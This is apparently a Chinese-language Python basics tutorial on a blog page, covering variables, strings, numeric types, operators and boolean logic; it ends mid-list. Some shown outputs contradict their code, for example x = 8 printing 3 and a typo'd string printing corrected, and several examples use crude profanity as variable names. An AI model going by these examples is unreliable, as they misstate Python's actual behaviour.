                <time title="عُدل: 2024-04-28 09:42:32" itemprop="dateModified" datetime="2024-04-28T09:42:32+08:00">2024-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">في</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%AD%E8%A8%80/" itemprop="url" rel="index"><span itemprop="name">语言</span></a>
                </span>
                  ، 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%AD%E8%A8%80/Python/" itemprop="url" rel="index"><span itemprop="name">Python</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Python-基础"><a href="#Python-基础" class="headerlink" title="Python 基础"></a>Python 基础</h1><h2 id="1-Pyhton-简述"><a href="#1-Pyhton-简述" class="headerlink" title="1. Pyhton 简述"></a>1. Pyhton 简述</h2><p><a target="_blank" rel="noopener" href="https://www.python.org">Pyhton 官网</a></p>
<h3 id="1-1-IDLE"><a href="#1-1-IDLE" class="headerlink" title="1.1 IDLE"></a>1.1 IDLE</h3><p>在 IDLE 的交互模式下，你给它一个指令，它立刻会还你一个反馈：<br><img src="/image/IDLE.png" alt="IDLE"></p>
<p>打开 IDLE 的编辑器模式<br>打开 IDLE，在菜单栏中依次点击 File-&gt;New File，或者直接使用快捷键 Ctrl+N：<br><img src="/image/IDLE编辑器.png" alt="IDLE编辑器模式"></p>
<h3 id="1-2-BIF-（Built-in-Function）"><a href="#1-2-BIF-（Built-in-Function）" class="headerlink" title="1.2 BIF （Built-in Function）"></a>1.2 BIF （Built-in Function）</h3><p>Python 提供了很多内置函数，以对付各种不同的需求。</p>
<p>在 IDLE 的交互模式下，输入 dir(<strong>builtins</strong>)，可以看到它们：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">dir(__builtins__)</span><br><span class="line"></span><br><span class="line">[&#x27;ArithmeticError&#x27;, &#x27;AssertionError&#x27;, &#x27;AttributeError&#x27;, &#x27;BaseException&#x27;, &#x27;BlockingIOError&#x27;, &#x27;BrokenPipeError&#x27;, &#x27;BufferError&#x27;, </span><br><span class="line">&#x27;BytesWarning&#x27;, &#x27;ChildProcessError&#x27;, &#x27;ConnectionAbortedError&#x27;, &#x27;ConnectionError&#x27;, &#x27;ConnectionRefusedError&#x27;, &#x27;ConnectionResetError&#x27;, &#x27;DeprecationWarning&#x27;, </span><br><span class="line">&#x27;EOFError&#x27;, &#x27;Ellipsis&#x27;, &#x27;EnvironmentError&#x27;, &#x27;Exception&#x27;, &#x27;False&#x27;, &#x27;FileExistsError&#x27;, &#x27;FileNotFoundError&#x27;, </span><br><span class="line">&#x27;FloatingPointError&#x27;, &#x27;FutureWarning&#x27;, &#x27;GeneratorExit&#x27;, &#x27;IOError&#x27;, &#x27;ImportError&#x27;, &#x27;ImportWarning&#x27;, &#x27;IndentationError&#x27;, &#x27;IndexError&#x27;, </span><br><span class="line">&#x27;InterruptedError&#x27;, &#x27;IsADirectoryError&#x27;, &#x27;KeyError&#x27;, &#x27;KeyboardInterrupt&#x27;, &#x27;LookupError&#x27;, &#x27;MemoryError&#x27;, &#x27;ModuleNotFoundError&#x27;, </span><br><span class="line">&#x27;NameError&#x27;, &#x27;None&#x27;, &#x27;NotADirectoryError&#x27;, &#x27;NotImplemented&#x27;, &#x27;NotImplementedError&#x27;, &#x27;OSError&#x27;, &#x27;OverflowError&#x27;, &#x27;PendingDeprecationWarning&#x27;, </span><br><span class="line">&#x27;PermissionError&#x27;, &#x27;ProcessLookupError&#x27;, &#x27;RecursionError&#x27;, &#x27;ReferenceError&#x27;, &#x27;ResourceWarning&#x27;, &#x27;RuntimeError&#x27;, &#x27;RuntimeWarning&#x27;, &#x27;StopAsyncIteration&#x27;, &#x27;StopIteration&#x27;, </span><br><span class="line">&#x27;SyntaxError&#x27;, &#x27;SyntaxWarning&#x27;, &#x27;SystemError&#x27;, &#x27;SystemExit&#x27;, &#x27;TabError&#x27;, &#x27;TimeoutError&#x27;, &#x27;True&#x27;, &#x27;TypeError&#x27;, &#x27;UnboundLocalError&#x27;, &#x27;UnicodeDecodeError&#x27;, </span><br><span class="line">&#x27;UnicodeEncodeError&#x27;, &#x27;UnicodeError&#x27;, &#x27;UnicodeTranslateError&#x27;, &#x27;UnicodeWarning&#x27;, &#x27;UserWarning&#x27;, &#x27;ValueError&#x27;, &#x27;Warning&#x27;, </span><br><span class="line">&#x27;WindowsError&#x27;, &#x27;ZeroDivisionError&#x27;, &#x27;__build_class__&#x27;, &#x27;__debug__&#x27;, &#x27;__doc__&#x27;, &#x27;__import__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, </span><br><span class="line">&#x27;abs&#x27;, &#x27;all&#x27;, &#x27;any&#x27;, &#x27;ascii&#x27;, &#x27;bin&#x27;, &#x27;bool&#x27;, &#x27;breakpoint&#x27;, &#x27;bytearray&#x27;, &#x27;bytes&#x27;, &#x27;callable&#x27;, &#x27;chr&#x27;, </span><br><span class="line">&#x27;classmethod&#x27;, &#x27;compile&#x27;, &#x27;complex&#x27;, &#x27;copyright&#x27;, &#x27;credits&#x27;, &#x27;delattr&#x27;, &#x27;dict&#x27;, &#x27;dir&#x27;, &#x27;divmod&#x27;, &#x27;enumerate&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;exit&#x27;, &#x27;filter&#x27;, &#x27;float&#x27;, &#x27;format&#x27;, &#x27;frozenset&#x27;, </span><br><span class="line">&#x27;getattr&#x27;, &#x27;globals&#x27;, &#x27;hasattr&#x27;, &#x27;hash&#x27;, &#x27;help&#x27;, &#x27;hex&#x27;, &#x27;id&#x27;, &#x27;input&#x27;, </span><br><span class="line">&#x27;int&#x27;, &#x27;isinstance&#x27;, &#x27;issubclass&#x27;, &#x27;iter&#x27;, &#x27;len&#x27;, &#x27;license&#x27;, &#x27;list&#x27;, &#x27;locals&#x27;, &#x27;map&#x27;, &#x27;max&#x27;, &#x27;memoryview&#x27;, &#x27;min&#x27;, &#x27;next&#x27;, &#x27;object&#x27;, &#x27;oct&#x27;, &#x27;open&#x27;, &#x27;ord&#x27;, &#x27;pow&#x27;, &#x27;print&#x27;, &#x27;property&#x27;, </span><br><span class="line">&#x27;quit&#x27;, &#x27;range&#x27;, &#x27;repr&#x27;, &#x27;reversed&#x27;, &#x27;round&#x27;, &#x27;set&#x27;, &#x27;setattr&#x27;, &#x27;slice&#x27;, &#x27;sorted&#x27;, &#x27;staticmethod&#x27;, &#x27;str&#x27;, &#x27;sum&#x27;, &#x27;super&#x27;, &#x27;tuple&#x27;, &#x27;type&#x27;, &#x27;vars&#x27;, &#x27;zip&#x27;]</span><br></pre></td></tr></table></figure>
<h3 id="1-3-查看-Python-官方文档"><a href="#1-3-查看-Python-官方文档" class="headerlink" title="1.3 查看 Python 官方文档"></a>1.3 查看 Python 官方文档</h3><p>打开 IDLE，依次点击右上角的 “Help” -&gt; “Python Docs”（或者直接按下快捷键F1）：<br><img src="/image/help.png" alt="查看帮助文档"></p>
<p>这就弹出了一个叫 Python Documentation 的帮助文档，点击左上角的“索引”，然后输入想要查询的关键字:<br><img src="/image/help1.png" alt="文档界面"></p>
<p>或者直接在交互界面输出 <code>help(obj)</code> 查询:<br><img src="/image/help2.png" alt="help(obj)"></p>
<h2 id="2-变量与字符串"><a href="#2-变量与字符串" class="headerlink" title="2.变量与字符串"></a>2.变量与字符串</h2><h3 id="2-1-1-变量"><a href="#2-1-1-变量" class="headerlink" title="2.1.1 变量"></a>2.1.1 变量</h3><p>在 Python 中，变量就是一个名字。</p>
<p>变量就是一个名字，一个标签，通过这个变量，你就能找到对应的数据。</p>
<h3 id="2-1-2-创建一个变量"><a href="#2-1-2-创建一个变量" class="headerlink" title="2.1.2 创建一个变量"></a>2.1.2 创建一个变量</h3><p>Python 的变量无需声明，只需要一次赋值，该变量就能够被成功创建：<br><code>&gt;&gt;&gt;  x = 8</code><br>这样我们就创建了一个变量，它的名字叫做x，它的值是8。<br>那么这个等于号（=），表示的是一个赋值操作，也就是将右边的数值8跟变量名x进行挂钩的意思。</p>
<h3 id="2-1-3-访问一个变量"><a href="#2-1-3-访问一个变量" class="headerlink" title="2.1.3 访问一个变量"></a>2.1.3 访问一个变量</h3><p>当一个变量被创建之后，使用变量名就可以直接访问该变量了：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(x)</span><br><span class="line">3</span><br></pre></td></tr></table></figure></p>
<h3 id="2-1-4-变量名"><a href="#2-1-4-变量名" class="headerlink" title="2.1.4 变量名"></a>2.1.4 变量名</h3><p>变量名呢，通常是由字母、数字和下划线（_）构成，但千万不能以数字打头，比如 fuckyou567 是合法的变量名，而 789bitch 却是非法的。<br><img src="/image/变量.png" alt="变量名"><br>另外，变量名是区分大小写的，也就是 FucK、fuck 在 Python 看来，是两个完全不同的名字。</p>
<p>Python3 还支持中文字符作为变量名，是的：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">唐僧 = 81</span><br><span class="line">print(唐僧)</span><br><span class="line">81</span><br></pre></td></tr></table></figure></p>
<h3 id="2-2-1-字符串（Double-quotes）"><a href="#2-2-1-字符串（Double-quotes）" class="headerlink" title="2.2.1 字符串（Double quotes）"></a>2.2.1 字符串（Double quotes）</h3><p>Double quotes 就是使用一对双引号将文本包含起来：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(&quot;I love Pyhton&quot;)</span><br><span class="line">I love Python</span><br></pre></td></tr></table></figure><br>混合使用 Single quotes 和 Double quotes 的技巧：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(&quot;Let&#x27;s go!&quot;)</span><br><span class="line">Let&#x27;s go!</span><br><span class="line">&gt;&gt;&gt; print(&#x27;&quot;Life is short, you need Python.&quot;&#x27;)</span><br><span class="line">&quot;Life is short, you need Python.&quot;</span><br></pre></td></tr></table></figure></p>
<h3 id="2-2-2-转义字符"><a href="#2-2-2-转义字符" class="headerlink" title="2.2.2 转义字符"></a>2.2.2 转义字符</h3><p><img src="/image/转义字符.png" alt="转义字符"></p>
<h3 id="2-2-3-原始字符串"><a href="#2-2-3-原始字符串" class="headerlink" title="2.2.3 原始字符串"></a>2.2.3 原始字符串</h3><p>使用原始字符串，可以避免反斜杠（\）被当作转义字符解析：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 未使用原始字符串</span><br><span class="line">&gt;&gt;&gt; print(&quot;D:\three\two\one\now&quot;)</span><br><span class="line">D:        hree        wo\one</span><br><span class="line">ow</span><br><span class="line">&gt;&gt;&gt; # 使用原始字符串</span><br><span class="line">&gt;&gt;&gt; print(r&quot;D:\three\two\one\now&quot;)</span><br><span class="line">D:\three\two\one\now</span><br></pre></td></tr></table></figure><br>多次换行可以在换行符 (\n) 再加一个反斜杠 <code>(\n\)</code> ：<br><img src="/image/换行.png" alt="多次换行"></p>
<h3 id="2-2-4-长字符串（Triple-quotes）"><a href="#2-2-4-长字符串（Triple-quotes）" class="headerlink" title="2.2.4 长字符串（Triple quotes）"></a>2.2.4 长字符串（Triple quotes）</h3><p>通常，使用三引号（单引号，双引号都可以——首尾呼应）字符串来引用多行文本：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; demo = &quot;&quot;&quot;</span><br><span class="line">知世故而不世故，</span><br><span class="line">弥天真而芬芳。</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure></p>
<h3 id="2-2-5-字符串加法和乘法"><a href="#2-2-5-字符串加法和乘法" class="headerlink" title="2.2.5 字符串加法和乘法"></a>2.2.5 字符串加法和乘法</h3><p>字符串相加我们叫做拼接，就是将字符串组合成一个长的新的字符串：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;365&#x27; + &#x27;258&#x27;</span><br><span class="line">&#x27;365258&#x27;</span><br></pre></td></tr></table></figure><br>还可以使用乘法符号（*）进行复制。<br>比如被老师罚写名字三百遍：<br><img src="/image/字符串乘法.png" alt="字符串乘法"></p>
<h2 id="3-运算符"><a href="#3-运算符" class="headerlink" title="3. 运算符"></a>3. 运算符</h2><h3 id="3-1-赋值运算符"><a href="#3-1-赋值运算符" class="headerlink" title="3.1 赋值运算符"></a>3.1 赋值运算符</h3><p>单独一个等于号（=）表示赋值运算符，作用是将右边的值跟左边的变量名进行挂钩。</p>
<h3 id="3-2-将字符串转换为整数"><a href="#3-2-将字符串转换为整数" class="headerlink" title="3.2 将字符串转换为整数"></a>3.2 将字符串转换为整数</h3><p>使用 int() 函数将指定的值转换成整数。</p>
<p>但要注意，并不是所有的字符串都能够转换为整数，比如 int(“Fuck”) 是无法转换的</p>
<h3 id="3-3-比较运算符"><a href="#3-3-比较运算符" class="headerlink" title="3.3 比较运算符"></a>3.3 比较运算符</h3><p><img src="/image/运算符.png" alt="运算符"></p>
<h3 id="3-4-is-同一性运算符"><a href="#3-4-is-同一性运算符" class="headerlink" title="3.4 is 同一性运算符"></a>3.4 <code>is</code> 同一性运算符</h3><p>is 运算符也称之为同一性运算符。<br>它是用于检验两个变量，是否指向同一个对象(内存)的运算符<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = &#x27;mortal&#x27;</span><br><span class="line">y = &#x27;mortal&#x27;</span><br><span class="line">x is y</span><br></pre></td></tr></table></figure></p>
<h2 id="4-数字类型"><a href="#4-数字类型" class="headerlink" title="4. 数字类型"></a>4. 数字类型</h2><p>Python 有三种不同的数字类型，分别是：整数、浮点数和复数。</p>
<h3 id="4-1-1-整数-integer"><a href="#4-1-1-整数-integer" class="headerlink" title="4.1.1 整数 (integer)"></a>4.1.1 整数 (integer)</h3><p>Python 的整数长度是不受限制的，也就是说它是有无限大的精度。<br>所以，你可以随时随地的进行大数运算：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 1568743148/115487896</span><br><span class="line">13.583615273413589</span><br></pre></td></tr></table></figure></p>
<h3 id="4-1-2-浮点数"><a href="#4-1-2-浮点数" class="headerlink" title="4.1.2 浮点数"></a>4.1.2 浮点数</h3><p>我们通常数学意义上的小数在编程里叫浮点数。<br>由于浮点数在计算机中的存储是存在 “误差” 的，所以有时候可能会闹出一些 “BUG”：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 0.1 + 0.2</span><br><span class="line">0.30000000000000004</span><br></pre></td></tr></table></figure></p>
<p>由于浮点数并不是 100% 精确的，所以我们拿浮点数来做比较就要特别小心了：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 0.3 == 0.1 + 0.2</span><br><span class="line">False</span><br></pre></td></tr></table></figure><br>可以借助<code>decimal</code>模块来进行十进制的运算<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import decimal</span><br><span class="line">&gt;&gt;&gt; a = decimal.Decimal(&quot;0.1&quot;)</span><br><span class="line">&gt;&gt;&gt; b = decimal.Decimal(&quot;0.2&quot;)</span><br><span class="line">&gt;&gt;&gt; print(a + b)</span><br><span class="line">0.3</span><br><span class="line">c = decimal.Decimal(&#x27;0.3&#x27;)</span><br><span class="line">a + b == c</span><br><span class="line">True</span><br></pre></td></tr></table></figure></p>
<h3 id="4-1-3-E记法"><a href="#4-1-3-E记法" class="headerlink" title="4.1.3 E记法"></a>4.1.3 E记法</h3><p>E 记法也就是平时我们所说的科学计数法，用于表示一些比较极端的数。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = 0.00005</span><br><span class="line">&gt;&gt;&gt; x</span><br><span class="line">5e-05</span><br></pre></td></tr></table></figure></p>
<h3 id="4-1-4-复数"><a href="#4-1-4-复数" class="headerlink" title="4.1.4 复数"></a>4.1.4 复数</h3><p>复数包含了一个实部和一个虚部：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 1 + 2j</span><br><span class="line">(1+2j)</span><br></pre></td></tr></table></figure><br>它们都是以浮点数的形式存放的，如果将一个复数赋值给一个变量 x，则可以通过 x.real 访问该复数的实部，x.imag 访问其虚部：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = 1 + 2j</span><br><span class="line">&gt;&gt;&gt; x.real</span><br><span class="line">1.0</span><br><span class="line">&gt;&gt;&gt; x.imag</span><br><span class="line">2.0</span><br></pre></td></tr></table></figure></p>
<h3 id="4-2-数字运算"><a href="#4-2-数字运算" class="headerlink" title="4.2 数字运算"></a>4.2 数字运算</h3><p>Python 支持的数字运算如下：<br><img src="/image/数字运算.jpg" alt="数字运算"></p>
<h4 id="4-2-1-四则运算"><a href="#4-2-1-四则运算" class="headerlink" title="4.2.1 四则运算"></a>4.2.1 四则运算</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 1 + 2</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; 1 - 2</span><br><span class="line">-1</span><br><span class="line">&gt;&gt;&gt; 1 * 2</span><br><span class="line">2</span><br><span class="line">&gt;&gt;&gt; 1 / 2</span><br><span class="line">0.5</span><br></pre></td></tr></table></figure>
<h4 id="4-2-2-地板除"><a href="#4-2-2-地板除" class="headerlink" title="4.2.2 地板除"></a>4.2.2 地板除</h4><p>双斜杠（//）表示一种特殊的除法 —— 地板除。<br>地板除原理是<strong>取比目标结果小的最大整数</strong>：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 3 // 2</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; -3 // 2</span><br><span class="line">-2</span><br></pre></td></tr></table></figure></p>
<h4 id="4-2-3-取余"><a href="#4-2-3-取余" class="headerlink" title="4.2.3 取余"></a>4.2.3 取余</h4><p>百分号（%）用于求两数相除的余数，如果能够整除，则余数为 0：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 3 % 2</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; 6 % 2</span><br><span class="line">0</span><br></pre></td></tr></table></figure></p>
<h4 id="4-2-4-被除数"><a href="#4-2-4-被除数" class="headerlink" title="4.2.4 被除数"></a>4.2.4 被除数</h4><p>地板除的结果乘以除数 + 余数 = 被除数：<br><code>x == (x // y) * y + (x % y)</code></p>
<h4 id="4-2-5-divmod-函数"><a href="#4-2-5-divmod-函数" class="headerlink" title="4.2.5 divmod() 函数"></a>4.2.5 divmod() 函数</h4><p>Python 有个内置函数叫 divmod()，它的作用就是同时求出两参数地板除的结果和余数：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; divmod(3, 2)</span><br><span class="line">(1, 1)</span><br><span class="line">&gt;&gt;&gt; divmod(-3, 2)</span><br><span class="line">(-2, 1)</span><br></pre></td></tr></table></figure></p>
<h4 id="4-2-6-abs-函数"><a href="#4-2-6-abs-函数" class="headerlink" title="4.2.6 abs()函数"></a>4.2.6 abs()函数</h4><p><strong>abs()</strong> 函数的作用是返回指定数值的绝对值：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = -520</span><br><span class="line">&gt;&gt;&gt; abs(x)</span><br><span class="line">520</span><br><span class="line">&gt;&gt;&gt; y = -3.14</span><br><span class="line">&gt;&gt;&gt; abs(y)</span><br><span class="line">3.14</span><br></pre></td></tr></table></figure><br>如果传入的是一个复数，abs() 函数返回的结果就是<em>复数的模</em>：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; z = 1 + 2j</span><br><span class="line">&gt;&gt;&gt; abs(z)</span><br><span class="line">2.23606797749979</span><br></pre></td></tr></table></figure></p>
<h4 id="4-2-7-int-float-和-complex-函数"><a href="#4-2-7-int-float-和-complex-函数" class="headerlink" title="4.2.7 int() float() 和 complex() 函数"></a>4.2.7 int() float() 和 complex() 函数</h4><p>int() 函数是将指定的值转换成整数，比如我们传入一个字符串 ‘250’，那么得到结果就是一个整数 250：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; int(&#x27;250&#x27;)</span><br><span class="line">250</span><br></pre></td></tr></table></figure><br>不过如果参数是一个浮点数，那么就要注意了，因为它得到的将是一个截掉小数的整数：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; int(3.14)</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; int(9.99)</span><br><span class="line">9</span><br></pre></td></tr></table></figure></p>
<ul>
<li><strong>注意：它是直接截取整数部分，扔掉小数部分，而不是四舍五入。</strong><br>同样的道理，float() 和 complex() 函数是将指定的值转换成浮点数和复数</li>
</ul>
<h4 id="4-2-8-pow-函数和幂运算符（-）"><a href="#4-2-8-pow-函数和幂运算符（-）" class="headerlink" title="4.2.8 pow() 函数和幂运算符（**）"></a>4.2.8 pow() 函数和幂运算符（**）</h4><p>通常情况下，pow() 函数和幂运算符（**）这两个实现的效果是等价的：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; pow(2, 3)</span><br><span class="line">8</span><br><span class="line">&gt;&gt;&gt; 2 ** 3</span><br><span class="line">8</span><br><span class="line">&gt;&gt;&gt; pow(2, -3)</span><br><span class="line">0.125</span><br><span class="line">&gt;&gt;&gt; 2 ** -3</span><br><span class="line">0.125</span><br></pre></td></tr></table></figure><br>不过，pow() 函数还留有一手，它支持第 3 个参数。<br>如果传入第 3 个参数，那么会将幂运算的结果和第 3 个参数进行取余数运算：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; pow(2, 3, 3)</span><br><span class="line">2</span><br></pre></td></tr></table></figure><br>相当于：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 2 ** 3 % 3</span><br><span class="line">2</span><br></pre></td></tr></table></figure></p>
<h2 id="5-布尔类型"><a href="#5-布尔类型" class="headerlink" title="5. 布尔类型"></a>5. 布尔类型</h2><p>布尔类型的值只有两个：True 或者 False，也就是 “真” 或者 “假”。</p>
<h3 id="5-1-bool-函数"><a href="#5-1-bool-函数" class="headerlink" title="5.1 bool() 函数"></a>5.1 bool() 函数</h3><p>使用 <code>bool()</code> 函数可以直接给出 True 或者 False 的结果：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; bool(250)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; bool(&quot;假&quot;)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; bool(&quot;False&quot;)</span><br><span class="line">True</span><br></pre></td></tr></table></figure></p>
<h3 id="5-2-真真假假"><a href="#5-2-真真假假" class="headerlink" title="5.2 真真假假"></a>5.2 真真假假</h3><p>结果是 True 的情况非常多，但 False 却是屈指可数，下面这些几乎就是结果为 False 的所有情况：</p>
<ul>
<li>定义为False的对象：None 和 False</li>
<li>值为 0 的数字类型：0, 0.0, 0j, Decimal(0), Fraction(0, 1)</li>
<li>空的序列和集合：’’, (), [], {}, set(), range(0)</li>
</ul>
<h3 id="5-3-真值检测"><a href="#5-3-真值检测" class="headerlink" title="5.3 真值检测"></a>5.3 真值检测</h3><p>Python 中任何对象都能直接进行<strong>真值检测</strong>（测试该对象的布尔类型值为 True 或者 False），用于 if 或者 while 语句的条件判断，也可以做为布尔逻辑运算符的操作数。</p>
<h3 id="5-3-逻辑运算符"><a href="#5-3-逻辑运算符" class="headerlink" title="5.3 逻辑运算符"></a>5.3 逻辑运算符</h3><p>Python 总共有三个逻辑运算符：and、or 和 not。<br><img src="逻辑运算符.jgp" alt="逻辑运算符"></p>
<p>对于 and 和 or 运算符，它的计算结果不一定是 True 或者 False。</p>
<p>这要看它的操作数是什么了，如果你给到操作数的是两个数值，那么它的运算结果也是数值：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 3 and 4</span><br><span class="line">4</span><br><span class="line">&gt;&gt;&gt; 4 or 5</span><br><span class="line">4</span><br></pre></td></tr></table></figure><br>如果你给到操作数的是两个字符串，那么它的结果也是字符串：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;Mortal&quot; and &quot;LOVE&quot;</span><br><span class="line">&#x27;LOVE&#x27;</span><br></pre></td></tr></table></figure><br>如歌你给到操作数是字符串和数值， <code>and</code> 时为数值, <code>or</code> 时为字符串<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;&quot;Mortal&quot; and 250</span><br><span class="line">250</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; &quot;Mortal&quot; or 350</span><br><span class="line">&#x27;Mortal&#x27;</span><br></pre></td></tr></table></figure></p>
<h3 id="5-4-短路逻辑"><a href="#5-4-短路逻辑" class="headerlink" title="5.4 短路逻辑"></a>5.4 短路逻辑</h3><p>and 和 or 这两个运算符都是遵从短路逻辑的。<br>短路逻辑的核心思想就是：从左往右，只有当第一个操作数的值无法确定逻辑运算的结果时，才对第二个操作数进行求值。</p>
<ul>
<li><code>and</code> 同为真时 返回 <strong>True</strong>。 </li>
